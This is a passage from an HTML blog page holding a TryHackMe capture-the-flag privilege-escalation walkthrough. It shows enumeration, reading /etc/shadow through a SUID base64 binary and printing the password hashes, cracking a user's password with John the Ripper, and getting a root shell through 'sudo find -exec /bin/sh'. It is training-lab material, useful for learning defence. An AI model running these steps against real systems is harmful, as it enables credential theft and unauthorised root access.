+cat: /etc/shadow: Permission denied</p>
+<p>[leonard@ip-10-10-209-223 ~]$ ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001
+inet 10.10.209.223  netmask 255.255.0.0  broadcast 10.10.255.255
+inet6 fe80::c2:65ff:fe95:f735  prefixlen 64  scopeid 0x20<link>
+ether 02:c2:65:95:f7:35  txqueuelen 1000  (Ethernet)
+RX packets 702  bytes 59983 (58.5 KiB)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 530  bytes 86419 (84.3 KiB)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</p>
+<p>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+inet 127.0.0.1  netmask 255.0.0.0
+inet6 ::1  prefixlen 128  scopeid 0x10<host>
+loop  txqueuelen 1000  (Local Loopback)
+RX packets 0  bytes 0 (0.0 B)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 0  bytes 0 (0.0 B)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</p>
+<p>virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
+ether 52:54:00:1b:aa:dc  txqueuelen 1000  (Ethernet)
+RX packets 0  bytes 0 (0.0 B)
+RX errors 0  dropped 0  overruns 0  frame 0
+TX packets 3  bytes 307 (307.0 B)
+TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</p>
+<pre><code>[jmk@arch THM]$ nmap -sVC -Pn 10.10.209.223
+</code></pre>
+<p>Starting Nmap 7.92 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2022-02-06 16:02 PST
+Nmap scan report for 10.10.209.223
+Host is up (0.47s latency).
+Not shown: 923 filtered tcp ports (no-response), 76 filtered tcp ports (host-unreach)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 95:09:13:a2:6e:3f:8d:21:10:5f:97:47:b1:67:a2:be (RSA)
+|   256 04:72:4a:a8:98:77:8f:53:4e:96:98:71:a9:76:8e:45 (ECDSA)
+|_  256 2c:74:b8:9f:c3:f2:36:80:4a:51:c4:35:f8:1f:7a:f9 (ED25519)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 77.70 seconds</p>
+<p>[leonard@ip-10-10-209-223 ~]$ find /home -name flag1.txt
+find: ‘/home/missy’: Permission denied
+find: ‘/home/rootflag’: Permission denied</p>
+<p>[leonard@ip-10-10-209-223 ~]$ find / -writable -type d 2&gt;/dev/null
+/dev/mqueue
+/dev/shm
+/proc/3502/task/3502/fd
+/proc/3502/fd
+/proc/3502/map_files
+/run/user/1000
+/var/tmp
+/tmp
+/tmp/.Test-unix
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/home/leonard
+/home/leonard/.mozilla
+/home/leonard/.mozilla/extensions
+/home/leonard/.mozilla/plugins
+/home/leonard/.cache
+/home/leonard/.cache/abrt
+/home/leonard/.config
+/home/leonard/.config/abrt
+/home/leonard/.local
+/home/leonard/.local/share
+/home/leonard/perl5</p>
+<p>[leonard@ip-10-10-209-223 ~]$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/bin/base64
+/usr/bin/ksu
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chage
+/usr/bin/newgrp
+/usr/bin/staprun
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/Xorg
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/sbin/userhelper
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/kde4/kpac_dhcp_helper
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+/usr/libexec/qemu-bridge-helper
+/usr/libexec/sssd/krb5_child
+/usr/libexec/sssd/ldap_child
+/usr/libexec/sssd/selinux_child
+/usr/libexec/sssd/proxy_child
+/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+/usr/libexec/flatpak-bwrap</p>
+<p>[leonard@ip-10-10-209-223 ~]$ getcap -r / 2&gt;/dev/null
+/usr/bin/newgidmap = cap_setgid+ep
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep</p>
+<p>[leonard@ip-10-10-209-223 ~]$ echo $PATH
+/home/leonard/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:/home/leonard/perl5/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:/home/leonard/.local/bin:/home/leonard/bin</p>
+<p>[leonard@ip-10-10-209-223 ~]$ find / -writable 2&gt;/dev/null | cut -d &ldquo;/&rdquo; -f 2 | sort -u
+dev
+home
+proc
+run
+sys
+tmp
+usr
+var</p>
+<p>[leonard@ip-10-10-209-223 ~]$ LFILE=/etc/shadow
+[leonard@ip-10-10-209-223 ~]$ /usr/bin/base64 &ldquo;$LFILE&rdquo; | base64 &ndash;decode
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:<em>:18353:0:99999:7:::
+daemon:</em>:18353:0:99999:7:::
+adm:<em>:18353:0:99999:7:::
+lp:</em>:18353:0:99999:7:::
+sync:<em>:18353:0:99999:7:::
+shutdown:</em>:18353:0:99999:7:::
+halt:<em>:18353:0:99999:7:::
+mail:</em>:18353:0:99999:7:::
+operator:<em>:18353:0:99999:7:::
+games:</em>:18353:0:99999:7:::
+ftp:<em>:18353:0:99999:7:::
+nobody:</em>:18353:0:99999:7:::
+pegasus:!!:18785::::::
+systemd-network:!!:18785::::::
+dbus:!!:18785::::::
+polkitd:!!:18785::::::
+colord:!!:18785::::::
+unbound:!!:18785::::::
+libstoragemgmt:!!:18785::::::
+saslauth:!!:18785::::::
+rpc:!!:18785:0:99999:7:::
+gluster:!!:18785::::::
+abrt:!!:18785::::::
+postfix:!!:18785::::::
+setroubleshoot:!!:18785::::::
+rtkit:!!:18785::::::
+pulse:!!:18785::::::
+radvd:!!:18785::::::
+chrony:!!:18785::::::
+saned:!!:18785::::::
+apache:!!:18785::::::
+qemu:!!:18785::::::
+ntp:!!:18785::::::
+tss:!!:18785::::::
+sssd:!!:18785::::::
+usbmuxd:!!:18785::::::
+geoclue:!!:18785::::::
+gdm:!!:18785::::::
+rpcuser:!!:18785::::::
+nfsnobody:!!:18785::::::
+gnome-initial-setup:!!:18785::::::
+pcp:!!:18785::::::
+sshd:!!:18785::::::
+avahi:!!:18785::::::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::</p>
+<pre><code>[jmk@arch THM]$ john missy_pass.txt --wordlist=~/Documents/InfoSec/THM/rockyou.txt
+</code></pre>
+<p>Warning: detected hash type &ldquo;sha512crypt&rdquo;, but the string is also recognized as &ldquo;sha512crypt-opencl&rdquo;
+Use the &ldquo;&ndash;format=sha512crypt-opencl&rdquo; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 16 OpenMP threads
+Press &lsquo;q&rsquo; or Ctrl-C to abort, almost any other key for status
+Password1        (?)
+1g 0:00:00:00 DONE (2022-02-06 16:21) 1.818g/s 7447p/s 7447c/s 7447C/s adriano..oooooo
+Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably
+Session completed</p>
+<p>[missy@ip-10-10-209-223 Documents]$ cat flag1.txt
+THM-42828719920544</p>
+<p>[missy@ip-10-10-209-223 home]$ sudo find . -exec /bin/sh ; -quit
+sh-4.2# whoami
+root</p>
+<pre><code>sh-4.2# cat flag2.txt
+</code></pre>
+<p>THM-168824782390238</p>
+
+            </div>
+        </article>
+    </main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/jon1123" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://www.linkedin.com/in/jonmkuhl/" target="_blank" rel="noopener noreferrer me"
+    title="LinkedIn">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+<a href="https://tryhackme.com/p/Jon112358" target="_blank" rel="noopener noreferrer me"
+    title="Tryhackme">
+    <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+</a>
+<a href="https://app.hackthebox.com/profile/1068091" target="_blank" rel="noopener noreferrer me"
+    title="HackTheBox">
+    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+</a>
+<a href="https://verified.elearnsecurity.com/certificates/6da8bdbd-63c2-4fa6-8722-ab75a9668fcb" target="_blank" rel="noopener noreferrer me"
+    title="EJPT">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+</a>
+<a href="https://discord.gg/VzKZZunue3" target="_blank" rel="noopener noreferrer me"
+    title="Discord">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
